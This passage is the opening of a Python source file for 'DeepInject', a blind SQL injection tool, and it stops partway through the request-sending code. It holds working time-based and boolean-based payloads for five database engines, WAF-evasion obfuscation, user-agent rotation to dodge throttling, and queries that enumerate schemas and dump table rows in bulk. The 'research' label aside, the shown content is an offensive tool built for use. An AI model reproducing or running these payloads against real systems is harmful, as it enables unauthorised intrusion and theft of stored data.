#!/usr/bin/env python3
"""
DeepInject v2.1 — Advanced Blind SQL Injection Research Framework
Techniques : Time-based Blind, Boolean-based Blind (+ automatic selection)
DBMS       : MySQL, MSSQL, PostgreSQL, Oracle, SQLite (native payloads each)
Features   : WAF bypass, multipart/form/json/get/cookie/header injection,
             adaptive timing, threading, full DB enumeration, obfuscation,
             checkpoint/resume, dump-all pipeline, rate limiting, live stats
"""

import requests
import time
import sys
import json
import csv
import os
import re
import signal
import hashlib
import argparse
import threading
import random
import statistics
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote, parse_qs
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Tuple, Any

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass

__version__ = "2.1"
__author__  = "JackTekno"
__github__  = "https://github.com/JackTekno"
__license__ = "MIT"


def _setup_console():
    """Keep progress output from crashing on legacy Windows code pages.

    The banner and table renderers use box-drawing glyphs; a cp1252/cp437
    console raises UnicodeEncodeError on them unless the stream is UTF-8
    (or at least error-tolerant).
    """
    for stream in (sys.stdout, sys.stderr):
        try:
            stream.reconfigure(encoding="utf-8", errors="replace")
        except (AttributeError, ValueError, OSError):
            pass


_setup_console()

VERSION = __version__
BANNER = r"""
  _____                 _____       _           _
 |  __ \               |_   _|     (_)         | |
 | |  | | ___  ___ _ __  | |  _ __  _  ___  ___| |_
 | |  | |/ _ \/ _ \ '_ \ | | | '_ \| |/ _ \/ __| __|
 | |__| |  __/  __/ |_) || |_| | | | |  __/ (__| |_
 |_____/ \___|\___| .__/_____|_| |_| |\___|\___|\__|
                  | |             _/ |
                  |_|            |__/

  v{ver}  |  Author : JackTekno
  Advanced Blind SQLi Research Framework
  GitHub  : https://github.com/JackTekno/DeepInject
  Source Code Repository  : https://github.com/JackTekno/DeepInject

  Techniques : Time-based | Boolean-based | Auto-select
  Evasion    : WAF bypass | Obfuscation | Adaptive timing | Rate limit
""".format(ver=VERSION)


# ─────────────────────────────────────────────────────────────
#  TECHNIQUE CONSTANTS
# ─────────────────────────────────────────────────────────────

TECH_TIME = "time"
TECH_BOOL = "bool"
TECH_AUTO = "auto"


def fmt_duration(seconds: float) -> str:
    """44.5 → '44.5s', 3725 → '1h 2m 5s'"""
    seconds = max(0.0, float(seconds))
    if seconds < 60:
        return f"{seconds:.1f}s"
    if seconds < 3600:
        return f"{int(seconds // 60)}m {int(seconds % 60)}s"
    return f"{int(seconds // 3600)}h {int((seconds % 3600) // 60)}m {int(seconds % 60)}s"


# Rotated per request with --rand-agent to break UA-based throttling/heuristics.
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
]


# ─────────────────────────────────────────────────────────────
#  RUNTIME STATS — requests, throughput, ETA, status codes
# ─────────────────────────────────────────────────────────────

class Stats:
    """Thread-safe request accounting for progress and ETA estimates."""

    def __init__(self):
        # RLock: snapshot() aggregates while holding the lock and its helper
        # accessors take the same lock, which would deadlock with threading.Lock.
        self.lock = threading.RLock()
        self.start = time.monotonic()
        self.requests = 0
        self.errors = 0
        self.timeouts = 0
        self.retries = 0
        self.bytes = 0
        self.send_time = 0.0
        self.samples: List[float] = []
        self.status_counts: Dict[int, int] = {}

    def record(self, elapsed: float, nbytes: int = 0, status: Optional[int] = None,
               error: bool = False, timeout: bool = False, retry: bool = False):
        with self.lock:
            self.requests += 1
            self.bytes += max(0, int(nbytes))
            self.send_time += max(0.0, float(elapsed))
            if error:
                self.errors += 1
            if timeout:
                self.timeouts += 1
            if retry:
                self.retries += 1
            if status:
                self.status_counts[status] = self.status_counts.get(status, 0) + 1
            self.samples.append(elapsed)
            if len(self.samples) > 200:
                del self.samples[:-200]

    def reset_timer(self):
        with self.lock:
            self.start = time.monotonic()

    @property
    def wall_time(self) -> float:
        return time.monotonic() - self.start

    def rate(self) -> float:
        wall = self.wall_time
        return (self.requests / wall) if wall > 0 else 0.0

    def avg_latency(self) -> float:
        with self.lock:
            return (self.send_time / self.requests) if self.requests else 0.0

    def median_latency(self) -> float:
        with self.lock:
            return statistics.median(self.samples) if self.samples else 0.0

    def snapshot(self) -> Dict[str, Any]:
        with self.lock:
            return {
                "requests": self.requests,
                "errors": self.errors,
                "timeouts": self.timeouts,
                "retries": self.retries,
                "bytes": self.bytes,
                "wall_time": round(self.wall_time, 3),
                "requests_per_second": round(self.rate(), 3),
                "avg_latency": round(self.avg_latency(), 3),
                "median_latency": round(self.median_latency(), 3),
                "status_codes": {str(k): v for k, v in sorted(self.status_counts.items())},
            }

    def summary_lines(self) -> List[str]:
        s = self.snapshot()
        codes = ", ".join(f"{k}×{v}" for k, v in s["status_codes"].items()) or "n/a"
        return [
            f"Requests     : {s['requests']}  (retries: {s['retries']}, errors: {s['errors']}, timeouts: {s['timeouts']})",
            f"Elapsed      : {fmt_duration(s['wall_time'])}  ({s['requests_per_second']} req/s)",
            f"Latency      : avg {s['avg_latency']}s  median {s['median_latency']}s",
            f"Traffic      : {s['bytes']} bytes received",
            f"Status codes : {codes}",
        ]


# ─────────────────────────────────────────────────────────────
#  CHECKPOINT STORE — resume long extractions
# ─────────────────────────────────────────────────────────────

class CheckpointStore:
    """JSON state file so long blind extractions survive a Ctrl-C / crash.

    Every completed step is memoized by key, so re-running with the same
    --state file skips work that was already paid for in requests.
    """

    def __init__(self, path: Optional[str], fresh: bool = False):
        self.path = path
        self.enabled = bool(path)
        self.lock = threading.RLock()
        self.data: Dict[str, Any] = {"version": __version__, "steps": {}}
        self.hits = 0
        if not self.enabled:
            return
        if fresh and os.path.exists(path):
            os.remove(path)
        elif os.path.exists(path):
            try:
                with open(path, "r", encoding="utf-8") as f:
                    loaded = json.load(f)
                if isinstance(loaded, dict) and "steps" in loaded:
                    self.data = loaded
                    self.data.setdefault("steps", {})
            except (json.JSONDecodeError, OSError) as e:
                print(f"\n[!] State file tidak terbaca ({e}) — mulai dari nol.")

    @staticmethod
    def key(*parts: Any) -> str:
        raw = "|".join(str(p) for p in parts)
        return hashlib.sha256(raw.encode("utf-8")).hexdigest()[:20]

    def get(self, *parts: Any) -> Optional[Any]:
        if not self.enabled:
            return None
        with self.lock:
            v = self.data["steps"].get(self.key(*parts))
            if v is not None:
                self.hits += 1
            return v

    def set(self, value: Any, *parts: Any):
        if not self.enabled:
            return
        with self.lock:
            self.data["steps"][self.key(*parts)] = value
            self.persist()

    def clear(self):
        if not self.enabled:
            return
        with self.lock:
            self.data = {"version": __version__, "steps": {}}
            self.persist()

    def persist(self):
        if not self.enabled:
            return
        tmp = f"{self.path}.tmp"
        try:
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump(self.data, f, indent=1, default=str)
            os.replace(tmp, self.path)
        except OSError as e:
            print(f"\n[!] Gagal menyimpan state: {e}", file=sys.stderr)

    def stats(self) -> str:
        return f"steps={len(self.data.get('steps', {}))} reused={self.hits}"


# ─────────────────────────────────────────────────────────────
#  RESPONSE FINGERPRINT — boolean-based inference
# ─────────────────────────────────────────────────────────────

@dataclass
class ResponseFingerprint:
    status: int = 0
    length: int = 0
    words: int = 0
    body_md5: str = ""

    @classmethod
    def capture(cls, resp: Optional[Any]) -> "ResponseFingerprint":
        if resp is None:
            return cls()
        body = resp.content or b""
        text = getattr(resp, "text", "") or ""
        return cls(
            status=resp.status_code,
            length=len(body),
            words=len(text.split()),
            body_md5=hashlib.md5(body).hexdigest(),
        )

    def diff_score(self, other: "ResponseFingerprint") -> int:
        """0 = indistinguishable, higher = more different."""
        score = 0
        if self.status != other.status:
            score += 1000
        if self.body_md5 != other.body_md5:
            score += 100
        score += abs(self.length - other.length)
        score += abs(self.words - other.words) * 2
        return score

    def same_as(self, other: "ResponseFingerprint", tolerance: int = 0) -> bool:
        return self.diff_score(other) <= tolerance


class _BoolTemplates:
    """Default TRUE/FALSE SQL fragments per DBMS (override with --bool-template).

    ``{c}`` is replaced with the boolean condition. Format: "true|false".
    """

    DEFAULTS = {
        "mysql":  "1 AND ({c})|1 AND NOT ({c})",
        "mssql":  "1 AND ({c})|1 AND NOT ({c})",
        "pgsql":  "1 AND ({c})|1 AND NOT ({c})",
        "sqlite": "1 AND ({c})|1 AND NOT ({c})",
        "oracle": "1 AND (CASE WHEN ({c}) THEN 1 ELSE 0 END)=1|1 AND (CASE WHEN ({c}) THEN 0 ELSE 1 END)=1",
    }

    @classmethod
    def for_dbms(cls, dbms: str) -> Tuple[str, str]:
        raw = cls.DEFAULTS.get(dbms, cls.DEFAULTS["mysql"])
        true_tpl, _, false_tpl = raw.partition("|")
        return true_tpl, (false_tpl or true_tpl)

    @classmethod
    def parse_override(cls, override: str) -> Optional[Tuple[str, str]]:
        if not override:
            return None
        true_tpl, sep, false_tpl = override.partition("|")
        if not sep or "{c}" not in true_tpl or "{c}" not in false_tpl:
            raise ValueError("--bool-template harus berformat 'true_tpl|false_tpl' dan memuat {c}")
        return true_tpl, false_tpl


# ─────────────────────────────────────────────────────────────
#  OBFUSCATOR — WAF Evasion Transforms
# ─────────────────────────────────────────────────────────────

class Obfuscator:

    SPACE_SUBS = ["/**/", "/*!*/", "%09", "%0a", "%0d", "\t"]

    @staticmethod
    def hex_str(s: str) -> str:
        return "0x" + s.encode().hex()

    @staticmethod
    def char_func(s: str) -> str:
        return "CHAR(" + ",".join(str(ord(c)) for c in s) + ")"

    @staticmethod
    def inline_comment(kw: str) -> str:
        if len(kw) < 3:
            return kw
        i = random.randint(1, len(kw) - 1)
        return kw[:i] + "/**/" + kw[i:]

    @staticmethod
    def case_mix(s: str) -> str:
        return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)

    @staticmethod
    def versioned_comment(s: str, ver: str = "50000") -> str:
        return f"/*!{ver} {s}*/"

    @classmethod
    def apply(cls, payload: str, level: int = 1) -> str:
        if level == 0:
            return payload
        result = payload
        if level >= 1:
            sub = random.choice(cls.SPACE_SUBS)
            result = result.replace(" ", sub)
        if level >= 2:
            for kw in ["SELECT", "FROM", "WHERE", "AND", "OR", "IF", "SLEEP"]:
                if kw in result:
                    result = result.replace(kw, cls.case_mix(kw), 1)
        if level >= 3:
            for kw in ["SLEEP", "SELECT", "IF", "ASCII"]:
                if kw in result:
                    result = result.replace(kw, cls.inline_comment(kw), 1)
        return result


# ─────────────────────────────────────────────────────────────
#  DBMS — Queries per Database Engine
# ─────────────────────────────────────────────────────────────

class DBMS:
    MYSQL  = "mysql"
    MSSQL  = "mssql"
    PGSQL  = "pgsql"
    ORACLE = "oracle"
    SQLITE = "sqlite"

    SLEEP = {
        MYSQL:  "SLEEP({n})",
        MSSQL:  "WAITFOR DELAY '0:0:{n}'",
        PGSQL:  "pg_sleep({n})",
        ORACLE: "BEGIN DBMS_LOCK.SLEEP({n}); END",
        SQLITE: "RANDOMBLOB(500000000)",
    }

    VERSION = {
        MYSQL:  "SELECT VERSION()",
        MSSQL:  "SELECT @@VERSION",
        PGSQL:  "SELECT version()",
        ORACLE: "SELECT banner FROM v$version WHERE rownum=1",
        SQLITE: "SELECT sqlite_version()",
    }

    CURRENT_DB = {
        MYSQL:  "SELECT DATABASE()",
        MSSQL:  "SELECT DB_NAME()",
        PGSQL:  "SELECT current_database()",
        ORACLE: "SELECT ora_database_name FROM dual",
        SQLITE: "SELECT 'main'",
    }

    CURRENT_USER = {
        MYSQL:  "SELECT USER()",
        MSSQL:  "SELECT SYSTEM_USER",
        PGSQL:  "SELECT current_user",
        ORACLE: "SELECT USER FROM dual",
        SQLITE: "SELECT 'sqlite_user'",
    }

    HOSTNAME = {
        MYSQL:  "SELECT @@HOSTNAME",
        MSSQL:  "SELECT HOST_NAME()",
        PGSQL:  "SELECT inet_server_addr()",
        ORACLE: "SELECT UTL_INADDR.get_host_name FROM dual",
        SQLITE: "SELECT 'localhost'",
    }

    DATA_DIR = {
        MYSQL: "SELECT @@datadir",
        MSSQL: "SELECT SERVERPROPERTY('InstanceDefaultDataPath')",
    }

    OS_USER = {
        MYSQL: "SELECT SUBSTRING_INDEX(USER(),'@',1)",
        MSSQL: "SELECT SYSTEM_USER",
    }

    DB_COUNT = {
        MYSQL:  "SELECT COUNT(schema_name) FROM information_schema.schemata",
        MSSQL:  "SELECT COUNT(name) FROM master..sysdatabases",
        PGSQL:  "SELECT COUNT(datname) FROM pg_database WHERE datistemplate=false",
        ORACLE: "SELECT COUNT(username) FROM all_users",
        SQLITE: "SELECT COUNT(name) FROM sqlite_master WHERE type='table'",
    }

    DB_NAME = {
        MYSQL:  "SELECT schema_name FROM information_schema.schemata ORDER BY schema_name LIMIT {idx},1",
        MSSQL:  "SELECT name FROM (SELECT ROW_NUMBER() OVER(ORDER BY name) rn,name FROM master..sysdatabases) t WHERE rn={idx1}",
        PGSQL:  "SELECT datname FROM pg_database WHERE datistemplate=false ORDER BY datname LIMIT 1 OFFSET {idx}",
        ORACLE: "SELECT username FROM (SELECT ROWNUM rn,username FROM all_users ORDER BY username) WHERE rn={idx1}",
        SQLITE: "SELECT name FROM sqlite_master WHERE type='table' ORDER BY name LIMIT {idx},1",
    }

    TABLE_COUNT = {
        MYSQL:  "SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema='{db}'",
        MSSQL:  "SELECT COUNT(name) FROM {db}..sysobjects WHERE xtype='U'",
        PGSQL:  "SELECT COUNT(tablename) FROM pg_tables WHERE schemaname='public'",
        ORACLE: "SELECT COUNT(table_name) FROM all_tables WHERE owner='{db}'",
        SQLITE: "SELECT COUNT(name) FROM sqlite_master WHERE type='table'",
    }

    TABLE_NAME = {
        MYSQL:  "SELECT table_name FROM information_schema.tables WHERE table_schema='{db}' ORDER BY table_name LIMIT {idx},1",
        MSSQL:  "SELECT name FROM (SELECT ROW_NUMBER() OVER(ORDER BY name) rn,name FROM {db}..sysobjects WHERE xtype='U') t WHERE rn={idx1}",
        PGSQL:  "SELECT tablename FROM pg_tables WHERE schemaname='public' ORDER BY tablename LIMIT 1 OFFSET {idx}",
        ORACLE: "SELECT table_name FROM (SELECT ROWNUM rn,table_name FROM all_tables WHERE owner='{db}' ORDER BY table_name) WHERE rn={idx1}",
        SQLITE: "SELECT name FROM sqlite_master WHERE type='table' ORDER BY name LIMIT {idx},1",
    }

    COL_COUNT = {
        MYSQL:  "SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{tbl}'",
        MSSQL:  "SELECT COUNT(name) FROM {db}..syscolumns WHERE id=OBJECT_ID('{tbl}')",
        PGSQL:  "SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name='{tbl}'",
        ORACLE: "SELECT COUNT(column_name) FROM all_tab_columns WHERE table_name='{tbl}'",
        SQLITE: "SELECT COUNT(*) FROM pragma_table_info('{tbl}')",
    }

    COL_NAME = {
        MYSQL:  "SELECT column_name FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{tbl}' ORDER BY column_name LIMIT {idx},1",
        MSSQL:  "SELECT name FROM (SELECT ROW_NUMBER() OVER(ORDER BY name) rn,name FROM {db}..syscolumns WHERE id=OBJECT_ID('{tbl}')) t WHERE rn={idx1}",
        PGSQL:  "SELECT column_name FROM information_schema.columns WHERE table_name='{tbl}' ORDER BY column_name LIMIT 1 OFFSET {idx}",
        ORACLE: "SELECT column_name FROM (SELECT ROWNUM rn,column_name FROM all_tab_columns WHERE table_name='{tbl}' ORDER BY column_name) WHERE rn={idx1}",
        SQLITE: "SELECT name FROM pragma_table_info('{tbl}') ORDER BY cid LIMIT {idx},1",
    }

    DUMP_ROW = {
        MYSQL:  "SELECT IFNULL(CAST({col} AS CHAR),'~NULL~') FROM {db}.{tbl} LIMIT {idx},1",
        MSSQL:  "SELECT TOP 1 ISNULL(CAST({col} AS VARCHAR(8000)),'~NULL~') FROM {db}..{tbl} WHERE {col} NOT IN (SELECT TOP {idx} {col} FROM {db}..{tbl} ORDER BY {col}) ORDER BY {col}",
        PGSQL:  "SELECT COALESCE(CAST({col} AS TEXT),'~NULL~') FROM {tbl} ORDER BY {col} LIMIT 1 OFFSET {idx}",
        ORACLE: "SELECT NVL(TO_CHAR({col}),'~NULL~') FROM (SELECT ROWNUM rn,{col} FROM {tbl} ORDER BY {col}) WHERE rn={idx1}",
        SQLITE: "SELECT IFNULL(CAST({col} AS TEXT),'~NULL~') FROM {tbl} LIMIT {idx},1",
    }

    # v2.1: Oracle was missing from every enumeration map, so `--dbms oracle`
    # silently returned nothing. ROWNUM-ordered wrappers work on all versions.
    DB_TABLE_NAMES = {
        MYSQL:  "information_schema.tables WHERE table_schema=DATABASE()",
        MSSQL:  "information_schema.tables",
        PGSQL:  "information_schema.tables WHERE table_schema='public'",
        ORACLE: "all_tables",
        SQLITE: "sqlite_master WHERE type='table'",
    }

    DUMP_ALL_TABLES = {
        MYSQL:  "SELECT table_name FROM information_schema.tables WHERE table_schema='{db}' AND table_type='BASE TABLE' ORDER BY table_name LIMIT {idx},1",
        MSSQL:  "SELECT name FROM (SELECT ROW_NUMBER() OVER(ORDER BY name) rn,name FROM {db}..sysobjects WHERE xtype='U') t WHERE rn={idx1}",
        PGSQL:  "SELECT tablename FROM pg_tables WHERE schemaname='public' ORDER BY tablename LIMIT 1 OFFSET {idx}",
        ORACLE: "SELECT table_name FROM (SELECT ROWNUM rn,table_name FROM all_tables ORDER BY table_name) WHERE rn={idx1}",
        SQLITE: "SELECT name FROM sqlite_master WHERE type='table' ORDER BY name LIMIT {idx},1",
    }

    ROW_COUNT = {
        MYSQL:  "SELECT COUNT(*) FROM {db}.{tbl}",
        MSSQL:  "SELECT COUNT(*) FROM {db}..{tbl}",
        PGSQL:  "SELECT COUNT(*) FROM {tbl}",
        ORACLE: "SELECT COUNT(*) FROM {tbl}",
        SQLITE: "SELECT COUNT(*) FROM {tbl}",
    }

    PRIVS = {
        MYSQL: "SELECT GROUP_CONCAT(PRIVILEGE_TYPE SEPARATOR ',') FROM information_schema.USER_PRIVILEGES WHERE GRANTEE=CONCAT(QUOTE(SUBSTRING_INDEX(USER(),'@',1)),'@',QUOTE(SUBSTRING_INDEX(USER(),'@',-1)))",
    }

    WRITABLE_DIR = {
        MYSQL: "SELECT @@secure_file_priv",
    }

    # v2.1: table size / row estimate per engine (used by --table-sizes)
    TABLE_SIZE = {
        MYSQL:  "SELECT CONCAT(IFNULL(TABLE_ROWS,0),' rows / ',IFNULL(ROUND((DATA_LENGTH+INDEX_LENGTH)/1024),0),' KB') FROM information_schema.tables WHERE table_schema='{db}' AND table_name='{tbl}'",
        MSSQL:  "SELECT CONCAT(SUM(p.rows),' rows') FROM {db}..sys.objects o JOIN {db}..sys.partitions p ON o.object_id=p.object_id WHERE o.name='{tbl}'",
        PGSQL:  "SELECT CONCAT(pg_total_relation_size('\"{db}\".\"{tbl}\"')/1024,' KB')",
        ORACLE: "SELECT TO_CHAR(num_rows)||' rows' FROM all_tables WHERE owner='{db}' AND table_name='{tbl}'",
        SQLITE: "SELECT (SELECT COUNT(*) FROM {tbl})||' rows'",
    }


# ─────────────────────────────────────────────────────────────
#  PAYLOAD FACTORY — native time-based payloads per DBMS
# ─────────────────────────────────────────────────────────────

class PayloadFactory:
    """Builds DBMS-native time-based payloads.

    Before v2.1 every --dbms value emitted MySQL syntax, so `--dbms pgsql`
    silently produced payloads the server could not execute. Each style below
    now has a real implementation per engine, and ``supports()`` tells the CLI
    which style numbers are meaningful for the selected DBMS.
    """

    STYLE_NAMES = [
        "IF-SLEEP", "SUBQUERY", "XOR", "CASE", "ELT", "AND-SLEEP",
        "DOUBLE-XOR", "BENCHMARK",
    ]

    _MYSQL = {
        0: lambda c, n: f"IF(({c})>0,SLEEP({n}),0)",
        1: lambda c, n: f"(SELECT(0)FROM(SELECT(SLEEP({n})))A WHERE ({c})>0)",
        2: lambda c, n: f"1 XOR(IF(({c})>0,SLEEP({n}),0)) XOR 1",
        3: lambda c, n: f"CASE WHEN ({c})>0 THEN SLEEP({n}) ELSE 0 END",
        4: lambda c, n: f"ELT(({c})>0,SLEEP({n}))",
        5: lambda c, n: f"1 AND SLEEP(IF(({c})>0,{n},0))",
        6: lambda c, n: (
            f"1 + ((SELECT 1 FROM (SELECT IF(({c})>0,SLEEP({n}),0))A))"
            f"/*'XOR(((SELECT 1 FROM (SELECT IF(({c})>0,SLEEP({n}),0))A)))OR'"
            f"|\"XOR(((SELECT 1 FROM (SELECT IF(({c})>0,SLEEP({n}),0))A)))OR\"*/"
        ),
        7: lambda c, n: f"(SELECT * FROM (SELECT IF(({c})>0,BENCHMARK(10000000,SHA1(1)),0))A)",
    }

    _MSSQL = {
        0: lambda c, n: f"IF (({c})>0) WAITFOR DELAY '0:0:{n}'",
        3: lambda c, n: f"IF 1=(CASE WHEN ({c})>0 THEN 1 ELSE 0 END) WAITFOR DELAY '0:0:{n}'",
        5: lambda c, n: f"1;IF ({c})>0 WAITFOR DELAY '0:0:{n}'-- -",
        1: lambda c, n: f"1;(SELECT 1 WHERE ({c})>0 AND 1=(SELECT 1 FROM (SELECT 1)X WHERE ({c})>0))WAITFOR DELAY '0:0:{n}'-- -",
        2: lambda c, n: f"1 XOR 1;IF ({c})>0 WAITFOR DELAY '0:0:{n}'-- -",
        7: lambda c, n: f"1;IF ({c})>0 WAITFOR DELAY '0:0:{n}'-- -",
    }

    _PGSQL = {
        0: lambda c, n: f"(SELECT 1 FROM PG_SLEEP({n}) WHERE ({c})>0)",
        1: lambda c, n: f"(SELECT CASE WHEN ({c})>0 THEN (SELECT 1 FROM PG_SLEEP({n})) ELSE 1 END)",
        3: lambda c, n: f"(SELECT CASE WHEN ({c})>0 THEN (SELECT 1 FROM PG_SLEEP({n})) END)",
        5: lambda c, n: f"1 AND (SELECT 1 FROM PG_SLEEP(CASE WHEN ({c})>0 THEN {n} ELSE 0 END))",
        2: lambda c, n: f"1 OR (SELECT 1 FROM PG_SLEEP(CASE WHEN ({c})>0 THEN {n} ELSE 0 END))",
        4: lambda c, n: f"(SELECT 1 FROM GENERATE_SERIES(1,CASE WHEN ({c})>0 THEN (SELECT 1 FROM PG_SLEEP({n}))::int ELSE 1 END))",
        7: lambda c, n: f"(SELECT CASE WHEN ({c})>0 THEN (SELECT 1 FROM PG_SLEEP({n})) END)",
    }

    _ORACLE = {
        0: lambda c, n: f"(CASE WHEN ({c})>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('DJ',{n}) ELSE 1 END)",
        3: lambda c, n: f"(CASE WHEN ({c})>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('DJ',{n}) ELSE 1 END)",
        5: lambda c, n: f"1 AND (CASE WHEN ({c})>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('DJ',{n}) ELSE 1 END)=1",
        1: lambda c, n: f"1 OR (CASE WHEN ({c})>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('DJ',{n}) ELSE 1 END)=1",
        2: lambda c, n: f"(CASE WHEN ({c})>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('DJ',{n}) ELSE 1 END)",
        7: lambda c, n: f"(CASE WHEN ({c})>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('DJ',{n}) ELSE 1 END)",
    }

    _SQLITE = {
        0: lambda c, n: f"1 AND ({c}) AND 1=(WITH RECURSIVE d(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM d WHERE x<{max(1, n) * 40000}) SELECT SUM(x) FROM d)",
        3: lambda c, n: f"CASE WHEN ({c}) THEN 1=(WITH RECURSIVE d(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM d WHERE x<{max(1, n) * 40000}) SELECT SUM(x) FROM d) ELSE 0 END",
        5: lambda c, n: f"1 AND ({c}) AND 1=(WITH RECURSIVE d(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM d WHERE x<{max(1, n) * 40000}) SELECT SUM(x) FROM d)",
        7: lambda c, n: f"1 AND ({c}) AND RANDOMBLOB({max(1, n) * 50000000})=1",
        4: lambda c, n: f"1 AND ({c}) AND RANDOMBLOB({max(1, n) * 50000000})=1",
    }

    TABLE = {
        DBMS.MYSQL: _MYSQL,
        DBMS.MSSQL: _MSSQL,
        DBMS.PGSQL: _PGSQL,
        DBMS.ORACLE: _ORACLE,
        DBMS.SQLITE: _SQLITE,
    }

    @classmethod
    def supports(cls, dbms: str, style: int) -> bool:
        return style in cls.TABLE.get(dbms, cls._MYSQL)

    @classmethod
    def styles_for(cls, dbms: str) -> List[int]:
        return sorted(cls.TABLE.get(dbms, cls._MYSQL).keys())

    @classmethod
    def build(cls, dbms: str, style: int, condition: str, sleep_sec: int) -> str:
        table = cls.TABLE.get(dbms, cls._MYSQL)
        fn = table.get(style)
        if fn is None:
            # Least-surprising fallback: the DBMS' primary style (0).
            fn = table[0]
        return fn(condition, sleep_sec)

    @classmethod
    def true_probe(cls, dbms: str, style: int, sleep_sec: int) -> str:
        """Unconditional probe used to confirm a style actually delays."""
        neutral = "(SELECT 1) IS NOT NULL"
        return cls.build(dbms, style, neutral, sleep_sec)


# ─────────────────────────────────────────────────────────────
#  TECHNIQUE DETECTION — pick time-based or boolean-based
# ─────────────────────────────────────────────────────────────

class TechniqueDetector:
    """Chooses an inference technique that actually produces a signal.

    Time-based needs the DBMS sleep primitive; boolean-based needs the
    application to render differently for TRUE vs FALSE. Either can be dead
    (WAF strips the function, query result is not reflected) while the other
    still works, so we measure instead of assuming.
    """

    def __init__(self, engine: "InjectionEngine"):
        self.engine = engine
        self.cfg = engine.cfg

    def probe_time_based(self) -> Tuple[bool, Optional[int]]:
        styles = PayloadFactory.styles_for(self.cfg.dbms)
        if self.cfg.payload_style in styles:
            styles = [self.cfg.payload_style] + [s for s in styles if s != self.cfg.payload_style]
        for style in styles:
            probe = PayloadFactory.true_probe(self.cfg.dbms, style, self.cfg.sleep_sec)
            if self.cfg.obfuscation_level > 0:
                probe = Obfuscator.apply(probe, self.cfg.obfuscation_level)
            if self.engine.is_delayed(probe):
                return True, style
        return False, None

    def probe_boolean_based(self) -> Tuple[bool, int]:
        ok, score = self.engine.calibrate_boolean()
        return ok, score


# ─────────────────────────────────────────────────────────────
#  CONFIG
# ─────────────────────────────────────────────────────────────

@dataclass
class Config:
    url: str
    inject_param: str
    inject_type: str = "multipart"

    multipart_fields: Dict[str, Any] = field(default_factory=dict)
    file_fields: List[str] = field(default_factory=list)

    cookies: Dict[str, str] = field(default_factory=dict)
    headers: Dict[str, str] = field(default_factory=dict)

    sleep_sec: int = 5
    threshold: float = 3.5
    retries: int = 3
    timeout: int = 20

    max_len: int = 128
    threads: int = 1

    dbms: str = DBMS.MYSQL
    obfuscation_level: int = 0
    payload_style: int = 6
    technique: str = TECH_AUTO

    output_file: Optional[str] = None
    output_fmt: str = "txt"
    proxy: Optional[str] = None
    verify_ssl: bool = False
    verbose: bool = False

    # ── v2.1 additions ───────────────────────────────────────
    sleep_jitter: float = 0.0
    max_retries_soft: int = 0
    request_delay: float = 0.0
    rand_agent: bool = False
    bool_template: Tuple[str, str] = field(default_factory=lambda: _BoolTemplates.for_dbms(DBMS.MYSQL))
    bool_tolerance: int = 0
    state_file: Optional[str] = None
    fresh: bool = False
    assume_yes: bool = False
    dump_all: bool = False
    dump_limit: int = 50
    exclude_dbs: List[str] = field(default_factory=lambda: ["information_schema", "mysql",
                                                            "performance_schema", "sys",
                                                            "pg_catalog", "pg_toast"])


# ─────────────────────────────────────────────────────────────
#  INJECTION ENGINE
# ─────────────────────────────────────────────────────────────

class InjectionEngine:
    """Core inference engine — time-based delays and boolean response diffing."""

    WRAPPERS = PayloadFactory.STYLE_NAMES

    def __init__(self, cfg: Config):
        self.cfg = cfg
        self.session = requests.Session()
        self.stats = Stats()
        self.state: Optional[CheckpointStore] = None
        self.memory: Dict[str, bool] = {}
        self.mem_lock = threading.Lock()
        self._last_fp: Optional[ResponseFingerprint] = None
        self.true_ref: Optional[ResponseFingerprint] = None
        self.false_ref: Optional[ResponseFingerprint] = None
        self.bool_tolerance = cfg.bool_tolerance
        if cfg.proxy:
            self.session.proxies = {"http": cfg.proxy, "https": cfg.proxy}

    # ── Transport ────────────────────────────────────────────

    def _throttle(self):
        delay = self.cfg.request_delay
        if delay <= 0:
            return
        if self.cfg.sleep_jitter > 0:
            delay += random.uniform(0, self.cfg.sleep_jitter)
        time.sleep(delay)

    def _request_once(self, payload_value: str) -> Optional[requests.Response]:
        cfg = self.cfg
        headers = dict(cfg.headers)
        if cfg.rand_agent:
            headers["User-Agent"] = random.choice(USER_AGENTS)
        kw: Dict[str, Any] = {
            "headers": headers,
            "cookies": cfg.cookies,
            "timeout": cfg.sleep_sec + cfg.timeout,
            "verify": cfg.verify_ssl,
        }

        if cfg.inject_type == "multipart":
            files: Dict[str, Any] = {}
            for k, v in cfg.multipart_fields.items():
                if k in cfg.file_fields:
                    files[k] = ("", b"", "application/octet-stream")
                else:
                    files[k] = (None, str(v))
            files[cfg.inject_param] = (None, payload_value)
            return self.session.post(cfg.url, files=files, **kw)

        if cfg.inject_type == "form":
            data = dict(cfg.multipart_fields)
            data[cfg.inject_param] = payload_value
            return self.session.post(cfg.url, data=data, **kw)

        if cfg.inject_type == "json":
            import copy
